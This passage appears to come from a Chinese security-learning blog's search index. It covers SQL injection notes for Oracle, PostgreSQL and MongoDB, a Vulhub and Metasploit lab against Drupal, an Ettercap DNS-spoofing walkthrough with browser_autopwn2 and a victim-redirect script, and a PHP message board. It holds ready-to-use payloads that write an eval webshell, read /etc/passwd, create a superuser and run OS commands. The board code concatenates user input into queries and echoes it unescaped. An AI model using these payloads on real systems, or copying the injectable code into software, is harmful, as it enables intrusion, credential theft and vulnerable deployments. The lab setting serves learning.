type=&quot;password&quot; name=&quot;password&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;br /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; style=&quot;width:4%;height:30px&quot;&gt; &lt;/form&gt;&lt;/center&gt; 12.4.1.2 使用BP抓包 12.4.1.3 构造payload 12.4.1.4 注入结果 12.4.2 正则注入12.4.2.1 代码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$host = &apos;127.0.0.1&apos;;$port = &apos;27017&apos;;$username = &apos;&apos;;$password = &apos;&apos;;$tb_users = &apos;mymessage.users&apos;;$tb_messages = &apos;mymessage.messages&apos;;$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://&#123;$host&#125;:&#123;$port&#125;&#125;&quot;);if (!empty($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) &#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $query = array( &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; $password, ); $query = new MongoDB\\Driver\\Query($query); $cursor = $manager-&gt;executeQuery($tb_users, $query)-&gt;toArray(); if (count($cursor)&gt;0) &#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;登陆成功！&quot;);&lt;/script&gt;&apos;; &#125;else&#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;你的用户名或密码错误&quot;);&lt;/script&gt;&apos;; &#125;&#125;?&gt;&lt;center&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;form action=&quot;login_2.php&quot; method=&apos;post&apos;&gt; &lt;h3&gt;名字：&lt;/h3&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;h3&gt;密码：&lt;/h3&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;br /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; style=&quot;width:4%;height:30px&quot;&gt; &lt;/form&gt;&lt;/center&gt; 12.4.2.2 使用BP抓包 12.4.2.3 将拦截到的数据包放到Intruder中 进行暴力破解之后，有3个匹配的结果 12.4.2.4 注入结果将上面结果中的l和1写在Intruder中继续暴破 得到的结果 重复上述步骤可以暴出账户和密码若碰到没有办法出现正确结果，可以在正则表达式添加$验证匹配是否结束，还可以尝试在Intruder-Payloads Options中添加新的字符 整个过程可以写python脚本进行，我不会写就不说了 13. Oracle注入13.1 Oracel数据库介绍Oracle数据库系统是美国Oracle(甲骨文)提供一款关系型数据库管理系统。航空、物流、银行、铁路、金融交易常用。特点：1.支持多用户、大事物量的处理2.数据安全性和完整性的有效控制3.支持分布式数据处理4.移植性强 13.2 判断数据库13.2.1 判断注入12and 1=1and 1=2 13.2.2 判断Oracle数据库12and exists(select * from dual)and exists(select * from user_tables) Oracle 表空间 13.3 判断列1order by 13.4 联合查询12union select null用null代替数字 13.5 获取数据类型不匹配的列在每列上逐个用数字代替，如果返回正常说明该列为数字类型，反之则为非数字类型。也可以逐个用引号引起来，如：&#39;null&#39;,null…from dual，返回正常说明该列为字符类型，反之为非数字类型。 13.6 获取基本信息在非数字类型列上获取数据 13.6.1 获取数据库版本1select banner from sys.v_$version where rownum=1 13.6.2 获取操作系统版本1select member from v$logfile where rownum=1 13.6.3 获取连接数据库的当前用户1select SYS_CONTEXT(&apos;USERENV&apos;,&apos;CURRENT_USER&apos;)from dual 13.6.4 获取数据库1select owner from all_tables where rownum=1 13.6.5 获取第一个表1select table_name from user_tables where rownum=1 13.6.6 获取第二个表1select table_name from user_tables where rownum=1 and table_name&lt;&gt;&apos;tablename&apos; 13.6.7 获取表下的第一个列名1select column_name from user_tab_columns where table_name=&apos;tablename&apos; and rownum=1 13.6.8 获取表下的第二个列名1select column_name from user_tab_columns where table_name=&apos;tablename&apos; and rownum=1 and column_name&lt;&gt;&apos;columnname&apos; 13.6.9 获取数据1select columnname from tablename 13.6.10 注入特点判断像access，order by和union select像mysql，爆表名、列名像mssql 13.7 第二种注入方式13.7.1 判断表是否存在在URL中加上 1and (select count(*) from tablename)&lt;&gt;0 若返回正常，说明存在tablename表。如果返回错误，可以更改表名继续猜解。 可以使用字典进行暴破 若 1and (select count(*) from admin)=1 返回正常说明只有一个管理员 13.7.2 判断表下列名是否存在1and (select count(columnname) from tablename) 13.7.3 使用ASCII码折半法猜解管理员账户和密码1and (select count(*) from where length(name)=5)=1 说明：length()函数用于求字符串的长度，此处猜测用户名的长度和5比较，即猜测是否由5个字符组成若返回正常，说明长度大于等于5 1and (select count(*) from tablename where ascii(substr(name,1,1))=97)=1 说明：substr()函数用于截取字符串，ascii()函数用于获取字符的ascii码，此处的意思是截取name字段的第一个字符，获取它的ascii码值，查询ascii码表可知97为字符a 14. Postgresql注入PostgreSQL是以加州大学伯克利分校计算机系开发的POSTGRES，现在已经更名为PostgreSQL，版本 4.2为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL支持大部分 SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL 可以用许多方法扩展，比如， 通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改、和分发 PostgreSQL，不管是私用、商用、还是学术研究使用。 14.1 Postgresql数据库注入常用语法14.1.1 判断是否为postgresql数据库1?id=1+and+1::int=1-- 返回正常则为postgresql数据库 14.1.2 判断数据库版本信息1?id=1+and+1=cast(version() as int)-- 14.1.3 判断当前用户1?id=1 and 1=cast(user||123 as int) 14.1.4 判断有多少字段12order byunion select null,null 和Oracle相似，不能用直接用数字 14.1.5 获取当前用户1union select null,null,user 14.1.6 获取数据库版本信息1union select null,version(),null-- 14.1.7 获取当前权限1union select null,current_schema(),null 14.1.8 获取当前数据库名称1union select null,current_database(),null 14.1.9 获取当前表名1union select null,relname,null from pg_stat_user_tables 14.1.10 读取每个表的列名1union select null,column_name,null from infromation_schena.columns where table_name=&apos;tablename&apos; 14.1.11 列字段内容1union select null,name||pass,null from admin 14.1.12 查看postgresql数据库的账号密码1union select null,username||chr(124)||passwd,null from pg_shadow 14.1.13 创建用户1;create user username with superuser password &apos;password&apos; -- 14.1.14 修改用户密码1;alter user username with password &apos;new password&apos; -- 14.1.15 Postgresql写Shell123;create table shell(shell text not null);;insert into shell values($$&lt;?php @eval($_POST[wind]);?&gt;$$);;copy shell(shell) to &apos;/var/www/html/shell.php&apos;; 另一种方法 1;copy (select &apos;$$&lt;?php @eval($_POST[wind]);?&gt;$$&apos;) to &apos;c/inetpub/wwwroot/mysql-sql/ddd.php&apos; 读取文件前20行 1pg_read_file(&apos;/etc/passwd&apos;,1,20) 14.1.16 创建system函数用于版本大于8的postgreslq数据库 14.1.16.1 创建system函数1create FUNCTION system(cstring) RETURN int AS &apos;lib/libc.so.6&apos;,&apos;system&apos; LANGUAGE &apos;c&apos; STRICT 14.1.16.2 创建一个输出表1create table stdout(idserial,system_out text) 14.1.16.3 执行shell，输出到输出表内1select system(&apos;uname -a &gt; /tmp/test&apos;) 14.1.16.4 copy输出的内容到表里：1COPY stdout(system_out) FROM &apos;/tmp/test&apos; 14.1.16.5 从输出表内读取执行后的回显，判断是否执行成功1union all select null,(select stdout from system_out order by id desc),null limit 1 offset 1 -- 14.1.17 数据库备份还原14.1.17.1 备份数据库1pg_dump -O -h ip -U postgres dbname &gt; c:\\mdb.sql 14.1.17.2 远程备份数据库备份到本地1pg_dump -O -h 本地IP -U dbowner -w -p port SS &gt; SS.sql 14.1.17.3 还原数据库1psql -h localhost -U postgres -d dbname 14.2 注入过程14.2.1 判断注入123&apos; 报错and 1=1 返回正常and 1=2 返回错误 14.2.2 获取信息14.2.2.1 获取数据库版本信息系统信息1and 1=cast(version() as int) 14.2.2.2 获取当前用户名称1and 1=cast(user||123 as int) 14.2.2.3 创建表1;create table tablename(w text not null); 14.2.2.4 导出一句话1;copy tablename to $$/var/www/webshell.php$$; 将一句话保存为webshell.php文件 15. Tips15.1 判断数字型注入还是字符型注入12?id=1 and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 15.2 注释在做sqli-labs-master的时候有些关可以直接使用#，有些关要将#进行URL编码写在payload中有些关可以直接使用--，有些关要将空格进行URL编码写在payload中 16. 防注入过滤函数 正则匹配 PDO预处理 waf 17. 参考[1] Sqli_labs通关文档 [2] 【学习笔记】MYSQL的floor报错原理分析总结 [3] 伪静态注入的总结 [4] are-pdo-prepared-statements-sufficient-to-prevent-sql-injection [5] 深入理解SET NAMES和mysql(i)_set_charset的区别 [6] Time-Based Blind SQL Injection using Heavy Query [7] mysql 二十余种报错注入姿势","categories":[],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'Vulhub搭建漏洞环境及简单测试'","slug":"Vulhub","date":"2019-04-09T12:39:11.000Z","updated":"2019-04-11T01:31:31.620Z","comments":true,"path":"2019/04/09/Vulhub/","link":"","permalink":"https://chirec.github.io/2019/04/09/Vulhub/","excerpt":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d","text":"1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-compose12pip install docker-composedocker-compose -v 第二个命令出现版本信息，表示安装成功。提示没有pip，安装提示安装pip 1.3 安装Vulhub1git clone https://github.com/vulhub/vulhub.git 2.搭建漏洞环境2.1 生成容器以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例 12cd /vulhub/drupal/CVE-2014-3704# docker-compose up -d 2.2 环境配置查看官方文档：Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704） 数据库设置 邮箱设置 无法向邮箱发送邮件，没必要写可以正常使用的邮箱 3.CMSmap扫描123git clone https://github.com/Dionach/CMSmap.gitcd CMSmappython3 cmsmap.py http://192.168.126.148:8080/ 4.使用MSF攻击1234567/etc/init.d/postgresql startmsfconsolesearch drupaluse exploit/multi/http/drupal_drupageddon set rhost 192.168.126.148set rport 8080run 5.docker使用5.1 添加加速12https://www.daocloud.io/mirrorcurl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 5.2 docker镜像操作1234docker search mysql //搜索docker pull 镜像名称 //下载docker images //查看本地已下载镜像docker rmi 镜像id //删除镜像 5.3 docker容器操作123456789101112docker run -d -p --name 容器名或镜像ID）-d 后台运行-p 随机分配端口-p 端口1（宿主机）:端口2（容器中）//端口转发docker ps //查看当前处于运行状态的容器docker start 容器ID或容器名 //开启容器docker stop 容器ID或容器名 //停止运行中的容器docker ps -a //查看停止的容器docker rm 容器ID或容器名 //删除容器docker exec -it 容器ID或容器名 /bin/bash //进入容器内部docker save 容器名/容器ID &gt; test.tar //导出容器docker load &lt; test.tar //导入容器 5.4 加入docker组安装完成之后，普通用户每次执行docker命令都需要加上sudo ，所以我们可以加入doker用户组获取操作权限 1.使用有sudo权限的帐号登录系统2.创建docker分组，并将相应的用户添加到这个分组里面3.退出，然后重新登录，以便让权限生效 1sudo usermod -aG docker your_username 6.参考[1] 一键安装Docker [2] 启动漏洞环境","categories":[],"tags":[]},{"title":"'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'","slug":"I-Want-to-see-U","date":"2019-04-08T11:01:44.000Z","updated":"2019-04-08T12:36:49.959Z","comments":true,"path":"2019/04/08/I-Want-to-see-U/","link":"","permalink":"https://chirec.github.io/2019/04/08/I-Want-to-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无","text":"1.工具介绍1.1Ettercap Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。 1.2MSF模块：browser_autopwn2 browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。 2.实验环境 角色 系统版本 IP 备注 靶机 Windows Server 2003 192.168.126.149 无 攻击机 Kali Linux 64 bit 2019.1a 192.168.126.126 无 3.实验过程3.1使用Ettercap进行DNS欺骗DNS欺骗过程和使用Ettercap和SET进行DNS欺骗、钓鱼过程相同，可以查看这篇文章。注意：进行DNS欺骗后，要开启Apache2服务才可以正常访问。上一篇中，SET自动开启了80端口，所以不需要开启Apache2服务。开启Apache2服务命令 12/etc/init.d/apache2 start/etc/init.d/apache2 status 3.2MSF模块生成恶意URL123456/etc/init.d/postgresql startmsfdb initmsfconsolesearch browser_autopwn2use auxiliary/server/browser_autopwn2run 没有什么需要修改的设置，使用模块之后，直接run就可以生成恶意URL了 3.3添加跳转脚本生成URL过程比较慢，这段时间我们给主页添加跳转脚本 1234&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; // 以下方式定时跳转setTimeout(&quot;javascript:location.href=&apos;Hello！&apos;&quot;, 1000); &lt;/script&gt; 将上方代码中的Hello！替换为MSF生成的恶意URL即可。 3.4靶机访问访问www.baidu.com，可以看到访问的是刚刚写的index.html 自动跳转到恶意URL 3.5测试结果在靶机访问恶意URL之后，MSF开始根据浏览器版本选择使用EXP并创建会话 3.6启动会话MSF创建会话之后，我们需要手动启用会话 1sessions -l 1sessions -i 1 123getuidgetsystemgetuid 4.参考[1] MSF自动化浏览器攻击与后门安装","categories":[],"tags":[]},{"title":"'使用PHP编写留言板Version2.0'","slug":"Create-Message-Board-with-PHP-Version-2-0","date":"2019-03-29T08:37:23.000Z","updated":"2019-03-31T07:40:39.172Z","comments":true,"path":"2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","link":"","permalink":"https://chirec.github.io/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/","excerpt":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。","text":"1.改进在上一篇使用PHP编写留言板的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。 1.1删除功能新的留言板添加了编辑选项，可以修改留言内容或删除留言。 1.2重复提交新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。 1.3时间显示问题在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。 2.功能介绍2.1删除留言123456789101112131415&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;]; $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;delete from messages where ID=$message_ID;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute();?&gt; 删除功能的实现，是通过在编辑页面点击链接时使用GET方式传入留言的ID，获得留言的ID后，通过PDO操作数据库删除留言。 2.2登陆1234567891011121314151617181920212223242526272829303132&lt;?php session_start(); header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; //数据库查询语句 $query=&quot;select Password from user where userName=&apos;$userName&apos;&quot;; // $res=$connect-&gt;prepare($query); $res-&gt;execute(); $result=$res-&gt;fetch(PDO::FETCH_ASSOC); if($pwd==$result[&apos;Password&apos;])&#123; echo &quot;登陆成功&quot;; $_SESSION[&apos;userName&apos;]=$userName; header(&quot;location:home.php&quot;); &#125;else&#123; echo &quot;登陆失败&quot;; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.3退出123456&lt;?php session_start(); unset($_SESSION[&apos;userName&apos;]); session_destroy(); header(&quot;location:login_page.php&quot;); ?&gt; 2.4发布留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $receiver=$_POST[&apos;receiver&apos;]; $time=date(&quot;Y-m-d H-i-s&quot;); $content=$_POST[&apos;content&apos;]; $query=&quot;insert into `messages` (sender,receiver,time,content) values(&apos;$userName&apos;,&apos;$receiver&apos;,&apos;$time&apos;,&apos;$content&apos;);&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(&quot;location:home.php&quot;);?&gt; 2.5注册1234567891011121314151617181920212223242526272829303132&lt;?php header(&quot;Content-Type:text/html; charset=utf-8&quot;); $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; //连接MySQL数据库 try&#123; //连接数据库 $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); echo &quot;Connect successed.&quot;.&quot;&lt;br&gt;&quot;; //用户提交登陆信息 $userName=$_POST[&apos;userName&apos;]; $pwd=$_POST[&apos;password&apos;]; $Name=$_POST[&apos;Name&apos;]; //数据库查询语句 $query=&quot;insert into `user` (userName,Password,Name) value(&apos;$userName&apos;,&apos;$pwd&apos;,&apos;$Name&apos;);&quot;; // if($_POST[&apos;userName&apos;]==&quot;&quot;or$_POST[&apos;password&apos;]==&quot;&quot;or$_POST[&apos;Name&apos;]==&quot;&quot;)&#123; echo &quot;不能为空&quot;; &#125;else&#123; $res=$connect-&gt;exec($query); if($res!=0)&#123; echo &quot;注册成功&quot;; &#125;else&#123; echo &quot;注册失败&quot;; &#125; &#125; &#125;catch(PDOException $error)&#123; echo &quot;Connect failed.&quot;.$error-&gt;getmessage(); &#125; $connect=NULL;?&gt; 2.6编辑留言123456789101112131415161718192021&lt;?php session_start(); if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125; $userName=$_SESSION['userName']; $message_ID=$_POST['ID']; $ip=\"localhost\"; $account=\"root\"; $password=\"root\"; $receiver=$_POST['receiver']; $time=date(\"Y-m-d H-i-s\"); $content=$_POST['content']; $ID=$_POST['ID']; $connect=new pdo(\"mysql:host=$ip;dbname=MessageBoard\",$account,$password); $query=\"update `messages` set receiver='$receiver',time='$time',content='$content' where ID='$ID';\"; $res=$connect-&gt;prepare($query); $res-&gt;execute(); $connect=NULL; header(\"location:home.php\");?&gt; 编辑留言功能实现的方式和删除留言的一样的，都是通过在编辑页面使用GET方式将留言ID传入到编辑留言页面，再通过一个隐藏的表单将留言ID所使用POST方式传入到编辑页面功能中，然后再使用PDO操作数据库编辑留言。 2.7Session1234567session_start();$_SESSEION['userName']=$userName;if(empty($_SESSION['userName']))&#123; header(\"location:login_page.php\"); &#125;unset($_SESSION['userName'];session_destory(); 2.7.1session_start()在把用户信息存储在$_SESSION数组之前，必须先启动会话。session_start()就是启动会话的函数。session_start()这个函数一般写在最开始的地方，在&lt;html&gt;标签之前即可。 2.7.2存储或取回session变量存储或取回都需要使用到$_SESSION变量。上面的代码中，将用户登录名（userName）存储到了$_SESSION中，在后面比对是也使用的是userName。 2.7.3简单的登陆判断使用if判断$_SESSION[‘userName’]是否为空来判断用户是否已经登陆，如果$_SESSION[‘userName’]为空，则跳转到登陆页面。 2.7.4删除session数据unset($_SESSION[‘userName’])和session_destory()都可以实现删除session数据的操作。在退出功能中写入，可以确保用户退出留言板。 3.数据库MessageBoard数据库有2个表，user表存放用户的注册信息，messages存放用户发布的留言。 3.1user表结构 3.2messages表结构 4.显示页面4.1编辑页面123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;th&gt;删除&lt;/th&gt; &lt;th&gt;编辑&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $message_ID=$result[&apos;ID&apos;]; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&apos;delete_message.php?id=$message_ID&apos;&gt;删除此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&apos;update_message_page.php?id=$message_ID&apos;&gt;编辑此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 使用GET方式通过&lt;a&gt;标签将留言ID发送到对应功能或页面。 4.2主页面（显示留言）12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;edit_message_page.php&quot;&gt;编辑留言&lt;/a&gt; &lt;table border=1&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos; or receiver=&apos;$userName&apos; or receiver=&apos;all&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 4.3登陆页面123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;a href=&quot;signup_page.php&quot;&gt;注册&lt;/a&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.4发布留言页面123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;发送留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;br&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;form action=&quot;send_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.5注册页面12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板注册&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板注册&lt;/h1&gt; &lt;form action=&quot;signup.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 昵&amp;nbsp;&amp;nbsp;&amp;nbsp;称：&lt;input type=&quot;text&quot; name=&quot;Name&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; 